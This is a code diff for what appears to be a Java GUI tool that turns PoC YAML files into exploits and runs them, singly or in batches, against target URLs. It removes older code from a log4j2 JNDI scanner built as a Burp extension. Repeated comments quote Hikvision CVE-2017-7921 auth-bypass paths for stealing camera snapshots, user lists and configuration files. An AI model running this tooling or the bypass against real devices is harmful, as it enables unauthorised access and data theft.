+    //        // 一次读入一行，直到读入null为文件结束
+    //        if((tempString = reader.readLine()) != null) {
+    //            if (tempString.contains("######f0ng######"))
+    //                pythonpath = tempString.split("######f0ng######")[1];
+    //        }
+    //        reader.close();
+    //    } catch (IOException e) {
+    //        e.printStackTrace();
+    //    } finally {
+    //        return pythonpath;
+    //    }
+    //}
+
+    @FXML
+    // mListView1 选中，鼠标选中
+    public void mListView1Click(MouseEvent event) throws FileNotFoundException {
+
+        ObservableList<String> strList ;
+
+        String os = System.getProperty("os.name");
+        System.out.println(System.getProperty("user.dir") + "\\" + mListView1.getSelectionModel().getSelectedItem() );
+
+        if(os.toLowerCase().startsWith("win")) {
+            strList = dirnametlistview2( System.getProperty("user.dir") + "\\poc\\" + mListView1.getSelectionModel().getSelectedItem() );
+
+            for (int i = 0; i < strList.size(); i++) {
+                String[] strlist_list = strList.get(i).split("\\\\");
+                strList.set(i, strlist_list[strlist_list.length-1]);
+            }
+        }
+        else
+            strList = dirnametlistview2("poc/" + mListView1.getSelectionModel().getSelectedItem() );
+
+        mListView2.setItems(strList);
+    }
+
+    @FXML
+    // mListView1 选中，键盘选中
+    public void mListView1Click2(KeyEvent event) throws FileNotFoundException {
+
+        ObservableList<String> strList ;
+
+        String os = System.getProperty("os.name");
+        System.out.println(System.getProperty("user.dir") + "\\" + mListView1.getSelectionModel().getSelectedItem() );
+
+        if(os.toLowerCase().startsWith("win")) {
+            strList = dirnametlistview2( System.getProperty("user.dir") + "\\poc\\" + mListView1.getSelectionModel().getSelectedItem() );
+
+            for (int i = 0; i < strList.size(); i++) {
+                String[] strlist_list = strList.get(i).split("\\\\");
+                strList.set(i, strlist_list[strlist_list.length-1]);
+            }
+
+        }
+        else
+            strList = dirnametlistview2("poc/" + mListView1.getSelectionModel().getSelectedItem() );
+
+        mListView2.setItems(strList);
+    }
+
+    @FXML
+    // mListView2 选中，出现关键字、响应时间、expname和exp描述，鼠标选中
+    public void mListView2Click(MouseEvent event) throws FileNotFoundException {
+        String strallowdirects ;
+        System.out.println(mListView2.getSelectionModel().getSelectedItem());
+        String[] conditioninformation;
+
+        String os = System.getProperty("os.name");
+        if(os.toLowerCase().startsWith("win"))
+            conditioninformation = ymlFiletoconditioninformation( System.getProperty("user.dir") + "\\poc\\" + mListView1.getSelectionModel().getSelectedItem() + "\\" + mListView2.getSelectionModel().getSelectedItem() );
+
+        else
+            conditioninformation = ymlFiletoconditioninformation("poc/" + mListView1.getSelectionModel().getSelectedItem() + "/" + mListView2.getSelectionModel().getSelectedItem() );
 
 
-        String[] white_lists = BurpExtender.this.whitelists_area.getText().split("\n");
-        String[] headers_lists = BurpExtender.this.customheaders_area.getText().split("\n");
-        File f;
-        int param_i = 0;
-        String privatednsResponseurl = "";
+        for (String str : conditioninformation)
+            if (str != null)
+                if (str.contains("condition"))
+                { // condition: {words:Content-Type:image/jpeg, time:null}
+                    String strwords = str.split(": \\{words:")[1].split(",")[0].trim(); // yml中的关键字
+                    System.out.println(strwords);
+                    mText4.setText(strwords);
+
+                    String strtime = str.split(": \\{words:")[1].split(", time:")[1].replace("}","").replace(", allowDirects:false","").trim(); // yml中的时间
+                    System.out.println(strtime);
+                    mText3.setText(strtime);
+
+                    if (str.contains("allowDirects")) {
+                        strallowdirects = str.split(": \\{words:")[1].split(", allowDirects:")[1].replace("}", "").trim(); // yml中的是否允许跳转
+                    }else
+                        strallowdirects = "true";
+                    mText32.setText(strallowdirects);
+
+                }else if(str.contains("expinformation"))
+                {// expinformation: {expname:hikvision, expdescribe:hikvision/CVE-2017-7921.yml,返回的为查看的图像(访问该链接可以直接查看海康威视的监控截图/onvif-http/snapshot?auth:YWRtaW46MTEK;访问该链接可以直接查看海康威视的用户列表/Security/users?auth:YWRtaW46MTEK;访问该链接可以直接获取海康威视的配置文件/System/configurationFile?auth:YWRtaW46MTEK)}
+
+                    String expname = str.split(":")[2].split(", ")[0].trim(); // yml中的expname
+                    mTextField6.setText(expname);
+
+
+                    String expdescribe = str.split(": ")[1].split(", expdescribe:")[1].replace("}","").trim(); // yml中的expdescribe
+                    mTextAreatest.setWrapText(true); // 自动换行
+                    mTextAreatest.setText(expdescribe);
+                }
+    }
+
+    @FXML
+    // mListView2 选中，出现关键字、响应时间、expname和exp描述，键盘选中
+    public void mListView2Click2(KeyEvent event) throws FileNotFoundException {
+        String strallowdirects ;
+        System.out.println(mListView2.getSelectionModel().getSelectedItem());
+        String[] conditioninformation;
+
+        String os = System.getProperty("os.name");
+        if(os.toLowerCase().startsWith("win"))
+            conditioninformation = ymlFiletoconditioninformation( System.getProperty("user.dir") + "\\poc\\" + mListView1.getSelectionModel().getSelectedItem() + "\\" + mListView2.getSelectionModel().getSelectedItem() );
+
+        else
+            conditioninformation = ymlFiletoconditioninformation("poc/" + mListView1.getSelectionModel().getSelectedItem() + "/" + mListView2.getSelectionModel().getSelectedItem() );
+
+
+        for (String str : conditioninformation)
+            if (str != null)
+                if (str.contains("condition"))
+                { // condition: {words:Content-Type:image/jpeg, time:null}
+                    String strwords = str.split(": \\{words:")[1].split(",")[0].trim(); // yml中的关键字
+                    System.out.println(strwords);
+                    mText4.setText(strwords);
+
+                    String strtime = str.split(": \\{words:")[1].split(", time:")[1].replace("}","").replace(", allowDirects:false","").trim(); // yml中的时间
+                    System.out.println(strtime);
+                    mText3.setText(strtime);
+
+                    if (str.contains("allowDirects")) {
+                        strallowdirects = str.split(": \\{words:")[1].split(", allowDirects:")[1].replace("}", "").trim(); // yml中的是否允许跳转
+                    }else
+                        strallowdirects = "true";
+                    mText32.setText(strallowdirects);
+
+                }else if(str.contains("expinformation"))
+                {// expinformation: {expname:hikvision, expdescribe:hikvision/CVE-2017-7921.yml,返回的为查看的图像(访问该链接可以直接查看海康威视的监控截图/onvif-http/snapshot?auth:YWRtaW46MTEK;访问该链接可以直接查看海康威视的用户列表/Security/users?auth:YWRtaW46MTEK;访问该链接可以直接获取海康威视的配置文件/System/configurationFile?auth:YWRtaW46MTEK)}
+
+                    String expname = str.split(":")[2].split(", ")[0].trim(); // yml中的expname
+                    mTextField6.setText(expname);
+
+
+                    String expdescribe = str.split(": ")[1].split(", expdescribe:")[1].replace("}","").trim(); // yml中的expdescribe
+                    mTextAreatest.setWrapText(true); // 自动换行
+                    mTextAreatest.setText(expdescribe);
+                }
+    }
+
+    @FXML
+    // mListView3 选中，出现命令，鼠标选中
+    public void mListView3Click(MouseEvent event) {
+        String a = "";
+
+        String[] list = readFileByLines2("property/cmdlists.txt");
+
+        Map<String,String> usualcmdlist2 = usualcmdlist(list);
+
+        System.out.println(mListView3.getSelectionModel().getSelectedItem());
+
+        for (Map.Entry<String, String> entry : usualcmdlist2.entrySet()) {
+            System.out.println(entry.getKey() +"++++" + entry.getValue());
+            if ((entry.getKey()).equals(mListView3.getSelectionModel().getSelectedItem()))
+            {
+                a = entry.getValue();
+            }
+        }
+        System.out.println(a);
+        mTextArea8.setText(a);
+    }
+
+    @FXML
+    // mListView3 选中，出现命令，键盘选中
+    public void mListView3Click2(KeyEvent event) {
+        String a = "";
+
+        String[] list = readFileByLines2("property/cmdlists.txt");
+
+        Map<String,String> usualcmdlist2 = usualcmdlist(list);
+
+        System.out.println(mListView3.getSelectionModel().getSelectedItem());
+
+        for (Map.Entry<String, String> entry : usualcmdlist2.entrySet()) {
+            System.out.println(entry.getKey() +"++++" + entry.getValue());
+            if ((entry.getKey()).equals(mListView3.getSelectionModel().getSelectedItem()))
+            {
+                a = entry.getValue();
+            }
+        }
+        System.out.println(a);
+        mTextArea8.setText(a);
+    }
+
+    @FXML
+    // mListView4 选中  pythonexp模块，鼠标选中
+    public void mListView4Click(MouseEvent event) throws FileNotFoundException {
+
+        ObservableList<String> strList = null;
+
+        String os = System.getProperty("os.name");
+        if(os.toLowerCase().startsWith("win")) {
+            strList = dirnametlistview2(System.getProperty("user.dir") + "\\pythonexp\\" + mListView4.getSelectionModel().getSelectedItem());
+            for (int i = 0; i < strList.size(); i++) {
+                String[] strlist_list = strList.get(i).split("\\\\");
+                strList.set(i, strlist_list[strlist_list.length-1]);
+            }
+        }
+        else
+            strList = dirnametlistview2("pythonexp/" + mListView4.getSelectionModel().getSelectedItem() );
+        mListView5.setItems(strList);
+    }
+
+    @FXML
+    // mListView4 选中  pythonexp模块，键盘选中
+    public void mListView4Click2(KeyEvent event) throws FileNotFoundException {
+
+        ObservableList<String> strList ;
+
+        String os = System.getProperty("os.name");
+        if(os.toLowerCase().startsWith("win")) {
+            strList = dirnametlistview2(System.getProperty("user.dir") + "\\pythonexp\\" + mListView4.getSelectionModel().getSelectedItem());
+            for (int i = 0; i < strList.size(); i++) {
+                String[] strlist_list = strList.get(i).split("\\\\");
+                strList.set(i, strlist_list[strlist_list.length-1]);
+            }
+        }
+        else
+            strList = dirnametlistview2("pythonexp/" + mListView4.getSelectionModel().getSelectedItem() );
+        mListView5.setItems(strList);
+    }
+
+    //@FXML
+    //// mListView5 选中  出现脚本参数用法，鼠标选中
+    //public void mListView5Click(MouseEvent event) throws FileNotFoundException {
+    //    String usage ;
+    //
+    //    String os = System.getProperty("os.name");
+    //    if(os.toLowerCase().startsWith("win"))
+    //        usage = readFileByoneLine(  System.getProperty("user.dir") + "\\pythonexp\\" + mListView4.getSelectionModel().getSelectedItem() + "\\" +mListView5.getSelectionModel().getSelectedItem() );
+    //    else
+    //        usage = readFileByoneLine("pythonexp/" + mListView4.getSelectionModel().getSelectedItem() + "/" + mListView5.getSelectionModel().getSelectedItem() );
+    //    mLabeltest2.setText(usage);
+    //}
+    //
+    //@FXML
+    //// mListView5 选中  出现脚本参数用法，键盘选中
+    //public void mListView5Click2(KeyEvent event) throws FileNotFoundException {
+    //    String usage ;
+    //
+    //    String os = System.getProperty("os.name");
+    //    System.out.println(System.getProperty("user.dir") + "\\pythonexp\\" + mListView5.getSelectionModel().getSelectedItem());
+    //    if(os.toLowerCase().startsWith("win")) {
+    //        usage = readFileByoneLine( System.getProperty("user.dir") + "\\pythonexp\\" + mListView4.getSelectionModel().getSelectedItem() + "\\" + mListView5.getSelectionModel().getSelectedItem());
+    //    }
+    //    else
+    //        usage = readFileByoneLine("pythonexp/" + mListView4.getSelectionModel().getSelectedItem() + "/" + mListView5.getSelectionModel().getSelectedItem() );
+    //    mLabeltest2.setText(usage);
+    //}
+
+
+    //将数据包保存到txt文件，如果文件不存在，则创建文件
+    private void poctoFile(String target,String filename) {
+        File file=new File(filename);
+        if(!file.exists())
+        {
+            try {
+                file.createNewFile();
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        }
+        try (FileWriter fileWriter = new FileWriter(filename)) {
+            fileWriter.append(target);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    public  void proxy(){ // 代理函数
+        if (!mLabeltest.getText().trim().equals("") && mLabeltest.getText().trim().contains("http")) {
+            String[] ipportlist = mLabeltest.getText().trim().split(":");
+            System.setProperty("https.proxyHost", ipportlist[2]);
+            System.setProperty("https.proxyPort", ipportlist[3]);
+            System.setProperty("http.proxyHost", ipportlist[2]);
+            System.setProperty("http.proxyPort", ipportlist[3]);
+            // http代理
+        } else {
+            System.setProperty("https.proxyHost", "");
+            System.setProperty("https.proxyPort", "");
+            System.setProperty("http.proxyHost", "");
+            System.setProperty("http.proxyPort", "");
+        }
+
+        if (!mLabeltest.getText().trim().equals("") && mLabeltest.getText().trim().contains("socks")) {
+            String[] ipportlist = mLabeltest.getText().trim().split(":");
+            System.getProperties().put("socksProxySet", "true");
+            System.getProperties().put("socksProxyHost", ipportlist[2]);
+            System.getProperties().put("socksProxyPort", ipportlist[3]);
+            // socks代理
+        } else {
+            System.getProperties().put("socksProxySet", "false");
+            System.getProperties().put("socksProxyHost", "");
+            System.getProperties().put("socksProxyPort", "");
+        }
+    }
+
+    @FXML
+    //发包按钮
+    public void onButtonClick(ActionEvent event) throws IOException {
+        JarFile jarFile = null;
+        String[][] request_header = null;
+        String ishttps = "http";
+        boolean isallowredirects = true;
+        if (mRadiobutton.isSelected())
+            ishttps = "https";
+
+        if (mRadiobutton1.isSelected())
+            isallowredirects = false;
+
+        String responsetime = null;
+        String responseheaderbody = null;
+
+        proxy();
+
+        //获取数据包的值
+        String target = mTextArea.getText() ;// 增加换行，当请求包有换行，两个换行的时候才能识别出来
         String os = System.getProperty("os.name");
         if (os.toLowerCase().startsWith("win")) {
-            f = new File("log4j2burpscanner.properties");
-        }else{
-            String jarPath = callbacks.getExtensionFilename(); // 获取当前jar的路径
-            f = new File(jarPath.substring(0, jarPath.lastIndexOf("/")) + "/" + "log4j2burpscanner.properties");
+            poctoFile(target, "property/test.txt");
+        }else {
+            poctoFile(target, "test.txt");
         }
-        BufferedReader reader = null;
-        StringBuffer sbf = new StringBuffer() ;
-        String output = "";
+
+        // 将test.txt放入jar包内，删除test.txt
+
+        String jarPath2 = Main.class.getProtectionDomain().getCodeSource().getLocation().getFile(); // 获取config.properties文件路径
+        String tempPath = jarPath2.substring(0, jarPath2.lastIndexOf("/")) + "/test.txt";
+        System.out.println(tempPath + "#####");
+        if (!jarPath2.contains(".jar") || os.toLowerCase().startsWith("win") ){
+            System.out.println("无jar，不进行jar包的修改！");
+//            try {
+//                String os = System.getProperty("os.name");
+//                if (os.toLowerCase().startsWith("win")) {
+//                    String[] command2 = new String[100];
+//                    Robot r = new Robot();
+//                    r.delay(500);
+//                    command2[0] = "del";
+//                    command2[1] = tempPath;
+//                    String[] commands2 = deleteArrayNull(command2);
+//                    Process pro2 = Runtime.getRuntime().exec(commands2);
+//
+//                } else {
+//                    String[] command2 = new String[100];
+//                    Robot r = new Robot();
+//                    r.delay(500);
+//                    command2[0] = "rm";
+//                    command2[1] = tempPath;
+//                    String[] commands2 = deleteArrayNull(command2);
+//                    Process pro2 = Runtime.getRuntime().exec(commands2);
+//                }
+//            } catch (Exception e) {
+//                // TODO: handle exception
+//            }
+        }else {
+            String[] command = new String[100];
+            command[0] = "jar";
+            command[1] = "uf";
+            command[2] = Main.class.getProtectionDomain().getCodeSource().getLocation().getFile();
+            command[3] = "test.txt";
+            // jar uf esjavaclient-0.0.1-SNAPSHOT.jar config.properties 替换jar里面的config.properties文件
+
+            String[] commands = deleteArrayNull(command);
+            try {
+                Process pro = Runtime.getRuntime().exec(commands);
+                os = System.getProperty("os.name");
+                if (os.toLowerCase().startsWith("win")) {
+                    System.out.println("windows");
+//                    String[] command2 = new String[100];
+//                    Robot r = new Robot();
+//                    r.delay(500);
+//                    command2[0] = "del";
+//                    command2[1] = tempPath;
+//                    String[] commands2 = deleteArrayNull(command2);
+//                    Process pro2 = Runtime.getRuntime().exec(commands2);
+                } else {
+                    String[] command2 = new String[100];
+                    Robot r = new Robot();
+                    r.delay(1000);
+                    command2[0] = "rm";
+                    command2[1] = tempPath;
+                    String[] commands2 = deleteArrayNull(command2);
+                    Process pro2 = Runtime.getRuntime().exec(commands2);
+                }
+            } catch (Exception e) {
+                // TODO: handle exception
+            }
+        }
+
+        String jarPath = Main.class.getProtectionDomain().getCodeSource().getLocation().getFile();
+        if (jarPath.contains(".jar") && !os.toLowerCase().startsWith("win")){ //判断是否为jar启动的
+            jarFile= new JarFile(jarPath);
+            JarEntry jarEntry = jarFile.getJarEntry("test.txt");
+            request_header = Readfile.readFileByLines(jarEntry);
+        }else if(os.toLowerCase().startsWith("win")){
+            request_header = Readfile.readFileByLines("property/test.txt");
+        }
+        else{ // 非jar启动就直接从当前目录取test.txt
+            System.out.println("无jar，所以调用readFileByLines的String方法");
+            request_header = Readfile.readFileByLines("test.txt");
+        }
+
+
+
+//        for (String[] str: request_header)
+//            for (String strr: str)
+//                System.out.println(strr);
+
+
+        Map<String, String> responseHeaderbody = listMakeRequest(request_header, ishttps,isallowredirects);
+//        System.out.println( "******" + responseHeaderbody);
+
+        for (String key : responseHeaderbody.keySet()) {
+            try {
+
+//                System.out.println(responseHeaderbody.get(key));
+                String[] response = responseHeaderbody.get(key).split("ms\n");
+                responsetime = response[0].split(":")[1].split("ms")[0];
+                responseheaderbody = key.replace("null:", "").replace("[", "").replace("]", "") + '\n' + response[1];
+//                System.out.println(responseheaderbody);
+
+            } catch (ArrayIndexOutOfBoundsException e) { // 防止响应包为空，导致response数组越界
+                responseheaderbody = key.replace("null:", "").replace("[", "").replace("]", "") + '\n';
+            }
+            //页面的响应时间回显
+            mLabel2.setText(responsetime);
+
+            //页面的响应包回显
+            mTextArea2.setText(responseheaderbody);
+        }
+    }
+
+    @FXML
+    //根据响应包条件确认该请求是否满足按钮
+    public void onButton2Click(ActionEvent event) {
+
+        //获取响应包关键字条件
+        String words = mTextField1.getText().trim();
+
+        //获取响应时间条件
+        String time = mTextField2.getText().trim();
+
+        //获取响应包的body
+        String responsebody = mTextArea2.getText().trim();
+
+        //获取响应时间
+        String responsetime = mLabel2.getText().trim();
+
+        if (words.equals("")){
+            if (responsetime.compareTo(time) >= 0) {
+                mLabel4.setText("满足！可以进行生成exp操作！");
+            } else {
+                mLabel4.setText("不满足！请少侠再仔细判断是否满足条件！");
+            }
+        }else if(time.equals("")){
+            if (responsebody.contains(words)) {
+                mLabel4.setText("满足！可以进行生成exp操作！");
+            } else {
+                mLabel4.setText("不满足！请少侠再仔细判断是否满足条件！");
+            }
+        }else {
+            if (time.compareTo(responsetime) >= 0 || responsebody.contains(words)) {
+                mLabel4.setText("满足！可以进行生成exp操作！");
+            } else {
+                mLabel4.setText("不满足！请少侠再仔细判断是否满足条件！");
+            }
+        }
+    }
+
+    @FXML
+    // 读取响应生成exp的yml文件按钮
+    public void onButton3Click(ActionEvent event) throws IOException {
+        JarFile jarFile;
+        String[][] request_header;
+        /*
+        * GET
+        http://www.baidu.com
+        HTTP/1.1
+        /
+        a=1
+
+        accept: 1
+        user-agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)
+        token: 123
+        Connection: keep-alive */
+
+        // 获取expname exp的名字
+        String expname = mTextField3.getText().trim();
+
+        // 获取expname exp的描述
+        String expdescribe = mTextArea3.getText().trim();
+
+        //获取响应包关键字条件
+        String words = mTextField1.getText().trim();
+
+        //获取响应时间条件
+        String time = mTextField2.getText().trim();
+
+        // 获取yml的名字
+        String ymlname = mTextField4.getText().trim();
+
+        boolean isallowredirects = true;
+
+        if (mRadiobutton1.isSelected())
+            isallowredirects = false;
+
+//        expdescribe = "'" + expdescribe + "'";
+
+        // 获取请求头
+
+
+
+//        String[][] request_header = Readfile.readFileByLines("property/test.txt");
+        String os = System.getProperty("os.name");
+        String jarPath = Main.class.getProtectionDomain().getCodeSource().getLocation().getFile();
+        if (jarPath.contains(".jar") && !os.toLowerCase().startsWith("win")){ //判断是否为jar启动的
+
+            jarFile= new JarFile(jarPath);
+
+            JarEntry jarEntry = jarFile.getJarEntry("test.txt");
+
+            request_header = Readfile.readFileByLines(jarEntry);
+
+        }else if (jarPath.contains(".jar") && os.toLowerCase().startsWith("win")){
+            request_header = Readfile.readFileByLines("property/test.txt");
+        }else{ // 非jar启动就直接从jar取test
+            request_header = Readfile.readFileByLines("test.txt");
+        }
+
+
+        System.out.println(ymlname);
+
+        boolean a =  Readfile.datatoymlFile(request_header,"poc/" + ymlname ,words,time,expname,expdescribe,isallowredirects);
+
+        ObservableList<String> strList = dirnametlistview1("poc");
+
+
+        if(os.toLowerCase().startsWith("win")) {
+            for (int i = 0; i < strList.size(); i++) {
+                String[] strlist_list = strList.get(i).split("\\\\");
+                strList.set(i, strlist_list[strlist_list.length-1]);
+            }
+        }
+        mListView1.setItems(strList);
+
+    }
+
+    @FXML
+    // 漏洞利用按钮
+    public void onButton4Click(ActionEvent event) throws FileNotFoundException {
+
+//        if (!mLabeltest.getText().trim().equals("") && mLabeltest.getText().trim().contains("http")) {
+//            String[] ipportlist = mLabeltest.getText().trim().split(":");
+//            System.setProperty("https.proxyHost", ipportlist[2]);
+//            System.setProperty("https.proxyPort", ipportlist[3]);
+//            System.setProperty("http.proxyHost", ipportlist[2]);
+//            System.setProperty("http.proxyPort", ipportlist[3]);
+//            // http代理
+//        }else{
+//            System.setProperty("https.proxyHost", "");
+//            System.setProperty("https.proxyPort", "");
+//            System.setProperty("http.proxyHost", "");
+//            System.setProperty("http.proxyPort", "");
+//        }
+//
+//        if (!mLabeltest.getText().trim().equals("") && mLabeltest.getText().trim().contains("socks")) {
+//            String[] ipportlist = mLabeltest.getText().trim().split(":");
+//            System.getProperties().put("socksProxySet","true");
+//            System.getProperties().put("socksProxyHost",ipportlist[2]);
+//            System.getProperties().put("socksProxyPort",ipportlist[3]);
+//            // socks代理
+//        }else{
+//            System.getProperties().put("socksProxySet","false");
+//            System.getProperties().put("socksProxyHost","");
+//            System.getProperties().put("socksProxyPort","");
+//        }
+        proxy();
+
+        //获取url
+        String url = mTextField5.getText().trim();
+//        //获取时间参数条件关键字
+//        String times = mText3.getText().trim();
+
+        //获取响应包条件关键字
+        String words = mText4.getText().trim();
+        String ishttps = "http";
+
+        if (url.contains("https") )
+                ishttps = "https";
+
+        String[] poctoexplist ;
+
+        String os = System.getProperty("os.name");
+        if(os.toLowerCase().startsWith("win"))
+            poctoexplist = poctoexp(System.getProperty("user.dir") + "\\poc\\" + mListView1.getSelectionModel().getSelectedItem() + "\\" + mListView2.getSelectionModel().getSelectedItem(),url,ishttps);
+
+        else
+            poctoexplist = poctoexp("poc/" + mListView1.getSelectionModel().getSelectedItem() + "/" + mListView2.getSelectionModel().getSelectedItem(),url,ishttps);
+
+        //页面的响应时间回显
+        mText5.setText(poctoexplist[0]);
+
+        //页面的响应包回显
+        mTextArea4.setText(poctoexplist[1]);
+
+        if (words.equals("null")){
+            mText6.setText("不存在相应的关键字回显\n(确认是否是关键字exp)");
+        } else {
+            if ( poctoexplist[1].contains(words)) {
+                //页面的是否有响应关键字回显
+                mText6.setText("存在相应的关键字回显");
+            } else {
+                mText6.setText("不存在相应的关键字回显\n(确认是否是关键字exp)");
+            }
+        }
+    }
+
+    @FXML
+    // 弹出代理窗口
+    public void onButton5Click(ActionEvent event) throws IOException {
+
+    Stage stage=new Stage();
+    Parent root = FXMLLoader.load(getClass().getResource("/proxy.fxml"));
+    stage.setTitle("设置代理");
+    stage.setScene(new Scene(root));
+    stage.show();
+    //将第二个窗口保存到map中
+    StageManager.STAGE.put("second", stage);
+    //将本窗口保存到map中
+    StageManager.CONTROLLER.put("Poc2ExpguiController", this);
+
+//    ProxyController second2=(ProxyController) StageManager.CONTROLLER.get("ProxyController");
+
+//    String ipporthttp = second2.mTextField66.getText().trim();
+//    System.out.println(ipporthttp);
+//    if (ipporthttp.equals("")){
+//        second2.mTextField66.setText("127.0.0.1:8080");
+//    }else{
+//        String index_ipport = mLabeltest.getText().trim();
+//        String[] index_ipport_lists = index_ipport.split("ip:port为:");
+//        second2.mTextField66.setText(index_ipport_lists[1]);
+//    }
+
+    }
+
+    @FXML
+    // 修改exp描述保存按钮
+    public void onButton6Click(ActionEvent event) throws IOException {
+
+        String filename = "poc/" + mListView1.getSelectionModel().getSelectedItem() + "/" + mListView2.getSelectionModel().getSelectedItem();
+
+        String expname = mTextField6.getText();
+
+        String expdescribe = mTextAreatest.getText();
+
+        System.out.println( expname +'\n' + expdescribe);
+        System.out.println(filename);
+
+        modifyFileContent(filename,"expname", expname );
+        modifyFileContent(filename,"expdescribe" ,expdescribe );
+    }
+
+    @FXML
+    // 批量按钮
+    public void onButton7Click(ActionEvent event) throws IOException {
+
+//        if (!mLabeltest.getText().trim().equals("") && mLabeltest.getText().trim().contains("http")) {
+//            String[] ipportlist = mLabeltest.getText().trim().split(":");
+//            System.setProperty("https.proxyHost", ipportlist[2]);
+//            System.setProperty("https.proxyPort", ipportlist[3]);
+//            System.setProperty("http.proxyHost", ipportlist[2]);
+//            System.setProperty("http.proxyPort", ipportlist[3]);
+//            // http代理
+//        }else{
+//            System.setProperty("https.proxyHost", "");
+//            System.setProperty("https.proxyPort", "");
+//            System.setProperty("http.proxyHost", "");
+//            System.setProperty("http.proxyPort", "");
+//        }
+//
+//        if (!mLabeltest.getText().trim().equals("") && mLabeltest.getText().trim().contains("socks")) {
+//            String[] ipportlist = mLabeltest.getText().trim().split(":");
+//            System.getProperties().put("socksProxySet","true");
+//            System.getProperties().put("socksProxyHost",ipportlist[2]);
+//            System.getProperties().put("socksProxyPort",ipportlist[3]);
+//            // socks代理
+//        }else{
+//            System.getProperties().put("socksProxySet","false");
+//            System.getProperties().put("socksProxyHost","");
+//            System.getProperties().put("socksProxyPort","");
+//        }
+        // todo python模块的批量需要带入到参数里
+
+        //获取url
+        String url = mTextArea5.getText().trim();
+
+//        String[] urllist = url.split("\n");
+//        for (String str : urllist)
+//            System.out.println(str);
+
+//        //获取时间参数条件关键字
+//        String times = mText3.getText().trim();
+//
+//        //获取响应包条件关键字
+//        String words = mText4.getText().trim();
+//
+//        if (times.equals("null"))
+//            times = "0";
+//
+//        if (words.equals("null"))
+//            words = "";
+
+        // 得到结果
+//        List<String> vulurllist = poctoexp("poc/" + mListView1.getSelectionModel().getSelectedItem() + "/" + mListView2.getSelectionModel().getSelectedItem(), urllist ,Integer.parseInt(times),words);
+//
+//        System.out.println(vulurllist);
+//
+//        for (String str:vulurllist)
+//            total = total + str +'\n';
+
+        poctoFile(url, "pythonexp/url.txt");
+        String pythonscript = "pythonexp/poc2jarpiliang.py";
+        String ymlFile = "poc/" + mListView1.getSelectionModel().getSelectedItem() + "/" + mListView2.getSelectionModel().getSelectedItem() ;
+        System.out.println(ymlFile);
+        String pythonpath = mTextField82.getText().trim();
+        String total = "";
+        String[] command = new String[100];
+        command[0] = pythonpath;
+        command[1] = pythonscript;
+        command[2] = ymlFile;
+
+        String[] commands = deleteArrayNull(command);
+
+        for (String s : commands)
+            System.out.println(s);
 
         try {
-            reader = new BufferedReader(new FileReader(f));
-            String tempStr;
-            while ((tempStr = reader.readLine()) != null) {
-                sbf.append(tempStr + '\n');
+            Process pro = Runtime.getRuntime().exec(commands);
+            InputStream is1 = pro.getInputStream();
+            InputStream is2 = pro.getErrorStream();
+            BufferedReader buf = new BufferedReader(new InputStreamReader(is1));
+            BufferedReader buf2 = new BufferedReader(new InputStreamReader(is2));
+
+            String line = null;
+            while ((line = buf.readLine()) != null) {
+                total = total + '\n' + line;
+                mTextArea5.setText(total.trim()); // 将python脚本输出结果回显
+                System.out.println(line);
             }
-            reader.close();
-            output =  sbf.toString();
-//            stdout.println(this.ceyeio);
-            if (output.contains("isuseceye=1")){
-                this.logxn = false;
-                this.ceyeio = true;
-                this.logxn_dnslog = FileGetValue(f,"ceyednslog");
-                this.ceyetoken = FileGetValue(f,"ceyetoken");
-            }else{
-                this.ceyeio = false;
-                this.logxn = true;
-            }
-            if (output.contains("isuseprivatedns=1")){
-                this.logxn = false;
-                this.ceyeio = false;
-                this.privatedns = true;
-                this.logxn_dnslog = FileGetValue(f,"privatednslogurl");
-                privatednsResponseurl = FileGetValue(f,"privatednsResponseurl");
-            }else if( output.contains("isuseprivatedns=0") ) {
-                this.privatedns = false;
+            while ((line = buf2.readLine()) != null) {
+                total = total + '\n' + line;
+                mTextArea5.setText(total.trim()); // 将python脚本输出结果回显
+                System.out.println(line);
             }
 
-            if (output.contains("isuseUserAgentTokenXff=0")){
-                this.isuseUserAgentTokenXff = false;
-            }else{
-                this.isuseUserAgentTokenXff = true;
-            }
-
-            if (output.contains("isuseXfflists=1")){
-                this.isuseXfflists = true;
-            }else{
-                this.isuseXfflists = false;
-            }
-
-            if (output.contains("isuseAllCookie=0")){
-                this.isuseAllCookie = false;
-            }else{
-                this.isuseAllCookie = true;
-            }
-
-            if(output.contains("isuseRefererOrigin=1")){
-                this.isuseRefererOrigin = true;
-            }else{
-                this.isuseRefererOrigin = false;
-            }
-
-            if(output.contains("isuseContenttype=1")){
-                this.isuseContenttype = true;
-            }else{
-                this.isuseContenttype = false;
-            }
-
-
-            if(output.contains("isuseAccept=1")){
-                this.isuseAccept = true;
-            }else{
-                this.isuseAccept = false;
-            }
-
-            if(output.contains("isip=1") && output.contains("isuseprivatedns=1")){
-                this.isip = true;
-                this.isipincreasing = false;
-            }else{
-                this.isip = false;
-                this.isipincreasing = true;
-            }
-
-            if( output.contains("isuseceye=0") && output.contains("isuseprivatedns=0")) {
-                this.logxn_dnslog = this.logxn_dnslog_code;
-                this.logxn = true;
-            }
-
-            if ( !BurpExtender.this.log4j2passivepattern_box.isSelected() ) // 关闭被动扫描
-                return null;
-
-//            if ( !BurpExtender.this.)
-
-
-
-            if (this.logxn_dnslog.contains("configure ceye api") && output.contains("isuseceye=0") && output.contains("isuseprivatedns=0"))
-                return null;
-
-            this.dnsldaprmi = FileGetValue(f, "dnsldaprmi").trim();
-            this.jndiparam = FileGetValue(f,"jndiparam").trim();
-
-        } catch (IOException e) {}
-
-        byte[] request = baseRequestResponse.getRequest();
-        URL url = this.helpers.analyzeRequest(baseRequestResponse).getUrl();
-        IRequestInfo analyzedIRequestInfo = this.helpers.analyzeRequest(request);
-
-        List<String> request_header = analyzedIRequestInfo.getHeaders(); // 获取请求头
-        // 循环获取参数，判断类型，进行加密处理后，再构造新的参数，合并到新的请求包中。
-
-        List<List> request_headers = new ArrayList<List>(); // 请求集
-
-        List<String> code_headers = new ArrayList<String>() ;// 原请求
-
-        IHttpService httpService = baseRequestResponse.getHttpService();
-        String host = httpService.getHost();
-        host = host + "." + httpService.getPort();
-        String request_header_host = headers_to_host(request_header) ;
-
-        // todo header头里的host匹配
-
-        if (host.equals("log.xn--9tr.com")) // 白名单设置
-            return null;
-
-        if ( white_lists.length > 0 && !white_lists[0].equals("")) { // 判断白名单不为空
-            for (String white_host_single : white_lists) // 白名单设置
-            {
-                white_host_single = white_host_single.replace("*", "");
